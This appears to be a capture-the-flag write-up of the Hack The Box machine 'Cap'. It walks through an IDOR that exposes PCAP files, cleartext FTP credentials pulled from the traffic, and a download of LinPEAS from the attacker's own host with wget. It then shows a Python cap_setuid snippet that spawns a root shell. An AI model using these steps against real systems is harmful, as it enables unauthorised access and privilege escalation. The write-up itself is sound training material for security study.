# Machine: Cap (Hack The Box)

## Enumeration

I started by running a port scan to identify the available services on the target machine.

```bash
nmap -sC -sV <target ip>
```

<img width="780" height="293" alt="nmap" src="https://github.com/user-attachments/assets/daed4a07-e8ec-4c6b-9d19-164043a05cd4" />

Three open ports were identified:
- **Port 21** — FTP service
- **Port 22** — SSH service
- **Port 80** — HTTP service (web application)

I began investigating the web application. It turned out to be a network security and analysis dashboard. Under the **Security Snapshot** tab, PCAP files were available containing network traffic recordings — however, the file for the ID I was currently accessing appeared to have no traffic.

<img width="1920" height="997" alt="web app id 10" src="https://github.com/user-attachments/assets/01681f77-f833-4fb8-8199-602cd361beb6" />

I then identified an **IDOR (Insecure Direct Object Reference)** vulnerability that allowed me to browse other users' snapshots simply by changing the ID value in the URL.

<img width="448" height="40" alt="url id" src="https://github.com/user-attachments/assets/f8de43ad-e6d2-4609-88f5-de3c6b866560" />

## Exploitation

By iterating through the IDs, I found network traffic present at ID **0**. I downloaded the `0.pcap` file and opened it in Wireshark. Analyzing the captured traffic, I found an FTP connection that exposed the username and password for user **nathan** in cleartext.

<img width="1920" height="1044" alt="credentials" src="https://github.com/user-attachments/assets/0062b33e-fbf7-4297-87d2-7423b3b95b55" />

Using these credentials, I logged into the FTP service as **nathan**, retrieved the first flag (`user.txt`), and also found a `linpeas.sh` file which I downloaded to my local machine.

> **Note:** LinPEAS is a script that automatically enumerates potential privilege escalation vectors on Linux systems.

I also used the same credentials to connect to the machine via SSH. Once logged in as a regular user, I needed to transfer `linpeas.sh` to the target machine. I hosted it via a simple Python HTTP server.

On my machine:
```bash
python3 -m http.server 8000
```

On the target machine:
```bash
wget http://<myIP>:8000/linpeas.sh
```

## Privilege Escalation

After running LinPEAS on the target, it revealed that **python3** had the `cap_setuid` capability — meaning it could change the UID of the current process, effectively allowing escalation to root (UID 0).

<img width="466" height="53" alt="set-uid" src="https://github.com/user-attachments/assets/f98ee82a-ba1a-4a50-96fc-a9301225b367" />

I used Python to set the UID to 0 and spawn a root shell.

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

With a root shell, I navigated to the `/root` directory and retrieved the second and final flag (`root.txt`), successfully completing the machine.

## Conclusion

The Cap machine demonstrated how simple logic flaws and misconfigurations can lead to full system compromise. The attack chain began with an IDOR vulnerability in the web application, where manipulating a numeric identifier in the URL allowed access to other users' PCAP files.

Analyzing the captured traffic revealed FTP credentials in cleartext, enabling initial access to the system and retrieval of the first flag. Using the same credentials, SSH access was obtained and local enumeration began.

LinPEAS identified an insecure Linux capability configuration — `python3` had `cap_setuid`, allowing the process UID to be changed to 0 and resulting in full privilege escalation to root.

This machine reinforces the importance of thorough enumeration, understanding application behavior, and knowing OS-level mechanisms such as UIDs and Linux capabilities. It also demonstrates that configuration flaws are often simpler and more effective attack vectors than complex vulnerabilities.
